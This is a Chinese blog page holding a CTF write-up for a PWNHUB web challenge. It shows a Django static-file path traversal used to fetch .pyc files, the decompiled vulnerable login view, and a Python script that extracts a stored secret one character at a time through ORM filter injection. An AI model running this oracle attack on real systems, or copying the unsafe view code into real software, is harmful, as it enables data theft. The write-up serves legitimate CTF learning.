@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="content-language" content="zh-cn">
+    <title>PWNHUB Web第一题writeup - virusdefender's blog (＾－＾)V</title>
+    <link rel="shortcut icon" href="/assets/img/favicon.ico">
+    <meta name="author"  content="virusdefender">
+    <meta name="description" content=" 学而不思则罔，思而不学则殆">
+    <meta name="keywords"  content="virusdefender,blog">
+    <!-- Open Graph -->
+    <meta property="og:title" content="PWNHUB Web第一题writeup - virusdefender's blog (＾－＾)V">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://strcpy.me/index.php/archives/755/">
+    <meta property="og:description" content=" 学而不思则罔，思而不学则殆">
+    <meta property="og:site_name" content="virusdefender's blog (＾－＾)V">
+    <link rel="stylesheet" href="//cdn.staticfile.org/normalize/6.0.0/normalize.min.css">
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_roc50gemkxpw4s4i.css">
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/prism.css">
+    <link rel="stylesheet" href="/assets/css/app.min.css">
+    <link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="https://strcpy.me/feed/" />
+</head>
+
+<body>
+    <!--[if lt IE 10]>
+<div class="alert-danger" role="alert">你的浏览器实在太太太旧了，放学别走，升级完浏览器再说！<a target="_blank" class="alert-link" href="http://browsehappy.com">立即升级</a></div>
+<![endif]-->
+    <header class="g-header">
+    <div class="g-logo">
+        <a href="/">virusdefender's blog (＾－＾)V</a>
+    </div>
+    <i id="menu-toggle" class="iconfont icon-menu"></i>
+    <nav class="g-nav">
+        <ul>
+            
+            <li><a href="/">home</a></li>
+            
+            <li><a href="http://www.npc.gov.cn/npc/xinwen/2016-11/07/content_2001605.htm">law</a></li>
+            
+            <li><a href="/index.php/archives/about/">about</a></li>
+            
+        </ul>
+    </nav>
+</header>
+
+
+<header class="g-banner post-header post-pattern-circuitBoard bgcolor-default post-no-cover" data-theme="default">
+    <div class="post-wrapper">
+        <div class="post-tags">
+             
+            
+            <a href="/tags/#安全" class="post-tag">安全</a>
+            
+            <a href="/tags/#CTF" class="post-tag">CTF</a>
+            
+            
+        </div>
+        <h1>PWNHUB Web第一题writeup</h1>
+        <div class="post-meta">
+            <time class="post-meta-item" datetime="2016-12-05 20:04"><i class="iconfont icon-date"></i>2016-12-05 20:04</time>
+        </div>
+    </div>
+</header>
+
+<div class="post-content">
+    
+    <article class="markdown-body">
+        <p>题目地址 http://54.223.46.206:8003/</p>
+
+<p>首先在HTTP头中可以看到 <code class="highlighter-rouge">Server:gunicorn/19.6.0 Django/1.10.3 CPython/3.5.2</code>，引用的站内资源只有一个js，然后回想起ph师傅的写过的Python Web安全的文章还有 http://www.lijiejie.com/python-django-directory-traversal/ ，发现在处理静态文件的时候有一个任意文件读取，但是任何<code class="highlighter-rouge">.py</code>结尾的文件都会提示403，其他的不会，考虑读取<code class="highlighter-rouge">pyc</code>，看了下自己的Django项目，Python 3.5的<code class="highlighter-rouge">pyc</code>都是在一个<code class="highlighter-rouge">__pycache__</code>目录中的，然后是<code class="highlighter-rouge">xxx.cpython-35.pyc</code>的文件名。</p>
+
+<p>Django 是一个 MVC 框架，默认的主要代码都在 <code class="highlighter-rouge">models.py</code> 和 <code class="highlighter-rouge">views.py</code>，成功的得到 pyc。然后使用 <a href="https://github.com/figment/unpyc3">unpyc3</a> 得到了源码。</p>
+
+<p>核心代码如下</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="k">class</span> <span class="nc">StaticFilesView</span><span class="p">(</span><span class="n">generic</span><span class="o">.</span><span class="n">View</span><span class="p">):</span>
+    <span class="n">content_type</span> <span class="o">=</span> <span class="s">'text/plain'</span>
+
+    <span class="k">def</span> <span class="nf">get</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
+        <span class="n">filename</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">kwargs</span><span class="p">[</span><span class="s">'path'</span><span class="p">]</span>
+        <span class="c"># 任意文件读取就是这里</span>
+        <span class="n">filename</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">settings</span><span class="o">.</span><span class="n">BASE_DIR</span><span class="p">,</span> <span class="s">'students'</span><span class="p">,</span> <span class="s">'static'</span><span class="p">,</span> <span class="n">filename</span><span class="p">)</span>
+        <span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">ext</span><span class="p">)</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">splitext</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">ext</span> <span class="ow">in</span> <span class="p">(</span><span class="s">'.py'</span><span class="p">,</span> <span class="s">'.conf'</span><span class="p">,</span> <span class="s">'.sqlite3'</span><span class="p">,</span> <span class="s">'.yml'</span><span class="p">):</span>
+            <span class="k">raise</span> <span class="n">exceptions</span><span class="o">.</span><span class="n">PermissionDenied</span><span class="p">(</span><span class="s">'Permission deny'</span><span class="p">)</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="k">return</span> <span class="n">HttpResponse</span><span class="p">(</span><span class="n">FileWrapper</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">),</span> <span class="mi">8192</span><span class="p">),</span> <span class="n">content_type</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">content_type</span><span class="p">)</span>
+        <span class="k">except</span> <span class="nb">BaseException</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+            <span class="k">raise</span> <span class="n">Http404</span><span class="p">(</span><span class="s">'Static file not found'</span><span class="p">)</span>
+            
+<span class="k">class</span> <span class="nc">LoginView</span><span class="p">(</span><span class="n">JsonResponseMixin</span><span class="p">,</span> <span class="n">generic</span><span class="o">.</span><span class="n">TemplateView</span><span class="p">):</span>
+	<span class="n">template_name</span> <span class="o">=</span> <span class="s">'login.html'</span>
+	<span class="k">def</span> <span class="nf">post</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
+		<span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">body</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+		<span class="n">stu</span> <span class="o">=</span> <span class="n">models</span><span class="o">.</span><span class="n">Student</span><span class="o">.</span><span class="n">objects</span><span class="o">.</span><span class="nb">filter</span><span class="p">(</span><span class="o">**</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">first</span><span class="p">()</span>
+		<span class="k">if</span> <span class="ow">not</span> <span class="n">stu</span> <span class="ow">or</span> <span class="n">stu</span><span class="o">.</span><span class="n">passkey</span> <span class="o">!=</span> <span class="n">data</span><span class="p">[</span><span class="s">'passkey'</span><span class="p">]:</span>
+			<span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">_jsondata</span><span class="p">(</span><span class="s">''</span><span class="p">,</span> <span class="mi">403</span><span class="p">)</span>
+		<span class="k">else</span><span class="p">:</span>
+			<span class="n">request</span><span class="o">.</span><span class="n">session</span><span class="p">[</span><span class="s">'is_login'</span><span class="p">]</span> <span class="o">=</span> <span class="bp">True</span>
+			<span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">_jsondata</span><span class="p">(</span><span class="s">''</span><span class="p">,</span> <span class="mi">200</span><span class="p">)</span>
+
+<span class="k">class</span> <span class="nc">Student</span><span class="p">(</span><span class="n">models</span><span class="o">.</span><span class="n">Model</span><span class="p">):</span>
+    <span class="n">name</span> <span class="o">=</span> <span class="n">models</span><span class="o">.</span><span class="n">CharField</span><span class="p">(</span><span class="s">'姓名'</span><span class="p">,</span> <span class="n">max_length</span><span class="o">=</span><span class="mi">64</span><span class="p">,</span> <span class="n">unique</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+    <span class="n">no</span> <span class="o">=</span> <span class="n">models</span><span class="o">.</span><span class="n">CharField</span><span class="p">(</span><span class="s">'学号'</span><span class="p">,</span> <span class="n">max_length</span><span class="o">=</span><span class="mi">12</span><span class="p">,</span> <span class="n">unique</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+    <span class="n">passkey</span> <span class="o">=</span> <span class="n">models</span><span class="o">.</span><span class="n">CharField</span><span class="p">(</span><span class="s">'密码'</span><span class="p">,</span> <span class="n">max_length</span><span class="o">=</span><span class="mi">32</span><span class="p">)</span>
+    <span class="n">group</span> <span class="o">=</span> <span class="n">models</span><span class="o">.</span><span class="n">ForeignKey</span><span class="p">(</span><span class="s">'Group'</span><span class="p">,</span> <span class="n">verbose_name</span><span class="o">=</span><span class="s">'所属班级'</span><span class="p">,</span> <span class="n">on_delete</span><span class="o">=</span><span class="n">models</span><span class="o">.</span><span class="n">CASCADE</span><span class="p">,</span> <span class="n">null</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">blank</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+
+
+<span class="k">class</span> <span class="nc">Group</span><span class="p">(</span><span class="n">models</span><span class="o">.</span><span class="n">Model</span><span class="p">):</span>
+    <span class="n">name</span> <span class="o">=</span> <span class="n">models</span><span class="o">.</span><span class="n">CharField</span><span class="p">(</span><span class="s">'班级名'</span><span class="p">,</span> <span class="n">max_length</span><span class="o">=</span><span class="mi">64</span><span class="p">)</span>
+    <span class="n">information</span> <span class="o">=</span> <span class="n">models</span><span class="o">.</span><span class="n">TextField</span><span class="p">(</span><span class="s">'介绍'</span><span class="p">)</span>
+    <span class="n">secret</span> <span class="o">=</span> <span class="n">models</span><span class="o">.</span><span class="n">CharField</span><span class="p">(</span><span class="s">'内部信息'</span><span class="p">,</span> <span class="n">max_length</span><span class="o">=</span><span class="mi">128</span><span class="p">)</span>
+    <span class="n">created_time</span> <span class="o">=</span> <span class="n">models</span><span class="o">.</span><span class="n">DateTimeField</span><span class="p">(</span><span class="s">'创建时间'</span><span class="p">,</span> <span class="n">auto_now_add</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+</code></pre>
+</div>
+
+<p>可以看到直接将用户发送的数据作为 filter 的条件传递了，如果用户存在，而 data 中没有 <code class="highlighter-rouge">passkey</code> 就会造成 500，如果用户不存在就会403，所以可以使用 Django 中的 like 查询。它的特点就是字段名后面添加两个下划线，接着才是搜索条件，可以作为参数传给 filter。</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="c"># 精确查询 where name="test"</span>
+<span class="n">Student</span><span class="o">.</span><span class="n">objects</span><span class="o">.</span><span class="nb">filter</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s">"test"</span><span class="p">)</span>
+
+<span class="c"># 按照字符串开头查询 where name="test%"</span>
+<span class="n">Student</span><span class="o">.</span><span class="n">objects</span><span class="o">.</span><span class="nb">filter</span><span class="p">(</span><span class="n">name__startswith</span><span class="o">=</span><span class="s">"test"</span><span class="p">)</span>
+
+<span class="c"># 按照字符串包含查询 where name="%test%"</span>
+<span class="n">Student</span><span class="o">.</span><span class="n">objects</span><span class="o">.</span><span class="nb">filter</span><span class="p">(</span><span class="n">name__contains</span><span class="o">=</span><span class="s">"test"</span><span class="p">)</span>
+</code></pre>
+</div>
+
+<p>其实这里还有个坑，但是后来给ph师傅说了之后还是填上了，防止题目过于难，就是这里Django使用的是sqlite3数据库，而sqlite3的like是不区分大小写的，而数据库里面存的确实是大小写混合的，然而实际上还是有两个解决方案的</p>
+
+<ul>
+  <li>爆破，12位密码去除数字，实际组合是<code class="highlighter-rouge">2^10</code>左右，也并不大</li>
+  <li>使用sql中的正则，类似<code class="highlighter-rouge">Studdent.objects.filter(name__regex="test")</code>，这样就和区分大小写的<code class="highlighter-rouge">contains</code>是一样的了。</li>
+</ul>
+
+<p>当然这个问题并不需要用户的密码，使用相同的方式去获取secret就好了。语句是<code class="highlighter-rouge">Student.objects.filter(group__secret__contains="pwnhub")</code>。最终利用的代码是</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">json</span>
+
+<span class="kn">import</span> <span class="nn">string</span>
+<span class="n">d</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">printable</span>
+
+<span class="n">passkey</span> <span class="o">=</span> <span class="s">"pwnhub"</span>
+
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">d</span><span class="p">:</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">"http://54.223.46.206:8003/login/"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s">"group__secret__contains"</span><span class="p">:</span> <span class="n">passkey</span> <span class="o">+</span> <span class="n">item</span><span class="p">}))</span>
+        <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">500</span><span class="p">:</span>
+            <span class="n">passkey</span> <span class="o">+=</span> <span class="n">item</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">passkey</span><span class="p">)</span>
+            <span class="k">break</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="nb">exit</span><span class="p">()</span>
+</code></pre>
+</div>
+
+
+
+        <section class="author-detail">
+            <section class="post-footer-item comment">
+                <a href="/comment.html?title=PWNHUB Web第一题writeup&article_id=/index.php/archives/755/" target="_blank">评论</a> | <a href="#" onclick="document.getElementById('wx-pay').style.display = ''; return false;">微信打赏</a> | 转载必须注明原文链接
+            </section>
+            <img src="https://storage.virusdefender.net/blog/images/utils/wx_pay_new.JPG" style="max-width: 90%;max-height: 90%; display: none;" id="wx-pay">
+        </section>
+    </article>
+</div>
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?e5ec0a55646c7c7c90dc530c56c80171";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<footer class="g-footer">
+    <section>virusdefender's blog (＾－＾)V © 2019</section>
+    <section>Powered by <a href="//jekyllrb.com">Jekyll</a> | <a href="https://github.com/kaeyleo/jekyll-theme-H2O">Theme H2O</a></section>
+</footer>
+
+
+    <script src="https://cdn.staticfile.org/jquery/3.2.1/jquery.min.js"></script>
+    <script src="/assets/js/prism.js"></script>
+    <script src="/assets/js/index.min.js"></script>
+</body>
+</html>
